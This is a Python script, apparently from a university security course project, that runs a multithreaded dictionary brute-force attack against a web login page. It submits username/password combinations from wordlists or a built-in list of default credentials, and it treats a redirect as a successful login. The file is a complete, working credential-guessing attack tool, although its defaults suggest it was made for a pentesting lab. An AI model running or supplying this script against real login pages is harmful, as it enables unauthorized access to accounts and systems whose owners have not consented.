#!/usr/bin/env python3

"""usage: brute_force.py <URL> [OPTIONS]

Script will attempt to execute a brute force attack against a URL
by attempting every combination of username|password that can be 
generated from a wordlist. 

Author: Alexander DuPree
https://gitlab.com/adupree/cs495-alexander-dupree/RCCI
"""

import argparse, requests, asyncio
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

class text:
    """ANSI Escape Sequences to add color to text"""
    magenta = '\033[95m'
    blue    = '\033[94m'
    green   = '\033[92m'
    yellow  = '\033[93m'
    red     = '\033[91m'
    reset   = '\033[0m'
    bold    = '\033[1m'
    uline   = '\033[4m'

''' Supported Brute force HTTP methods '''
METHODS = [ 'POST', 'GET' ]

DEFAULT_CREDENTIALS = [ 'admin'
                      , 'test'
                      , 'secret'
                      , '1234'
                      , 'password'
                      , 'password1234'
                      , 'p4ssw0rd'
                      , 'administrator'
                      , 'pentesterlab' ]

def try_authenticate(session, usernames, passwd, args):
    method = { METHODS[0] : session.post 
             , METHODS[1] : session.get }
    request = method[args.method]

    for username in usernames:
        payload = { args.login  : username
                , args.password : passwd }

        payload[args.password] = passwd

        if(args.verbose):
            print(f'[*] Attempting {username}::{passwd}')

        resp = request(args.url, data=payload)

        if resp.url != args.url: # Redirect occured, we authenticated
            return (username, passwd)

async def brute_force_async(args):
    results = []

    usernames = DEFAULT_CREDENTIALS
    passwords = DEFAULT_CREDENTIALS

    if(args.file):
        with open(args.file) as file:
            passwords = file.read().splitlines()
    if(args.userfile):
        with open(args.userfile) as file:
            usernames = file.read().splitlines()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        session = requests.Session()

        loop = asyncio.get_event_loop()

        tasks = [ 
            loop.run_in_executor(
                executor, 
                try_authenticate,
                *(session, usernames, password, args)
            )
            for password in passwords
        ]
        results = [await f for f in tqdm(asyncio.as_completed(tasks), total=len(tasks))]
    
    authenticated = False
    for result in results:
        if result:
            authenticated = True
            print(f'\n{text.green}Authenticated{text.reset}: {result}')
    if not authenticated:
        print(f'\nBrute Force Failed! Try a different dictionary')

def main(args):
    print(f'[*] Started Brute Force for {text.red}{args.url}{text.reset}')
    print(f'[*] Brute Forcing with {args.threads} threads')
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(brute_force_async(args))
    loop.run_until_complete(future)
    return 0

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
            description="Brute force an authentication page"
            )
    parser.add_argument( 'url'
                       , metavar='URL'
                       , help="URL endpoint of authentication page"
                       )
    parser.add_argument( '-f', '--file'
                       , default=''
                       , help="text file of password list. (\\n delimited)"
                       )
    parser.add_argument('-u', '--userfile'
                       , default=''
                       , help='text file of username list. (\\n delimited)'
                       )
    parser.add_argument( '-v', '--verbose'
                       , help="increase output verbosity"
                       , action='store_true'
                       )
    parser.add_argument('-m', '--method'
                       , choices=METHODS
                       , default=METHODS[0]
                       , help=f'HTTP Method, defaults to {METHODS[0]}'
                       )
    parser.add_argument('-l', '--login'
                       , default='login'
                       , help='login parameter name for authentication page'
                       )
    parser.add_argument('-p', '--password'
                       , default='password'
                       , help='password parameter name for authentication page'
                       )
    parser.add_argument('-t', '--threads'
                       , choices=range(1,100)
                       , default=10
                       , type=int
                       , metavar='THREADS'
                       , help='Number of threads to execute brute force attack'
                       )
    main(parser.parse_args())
    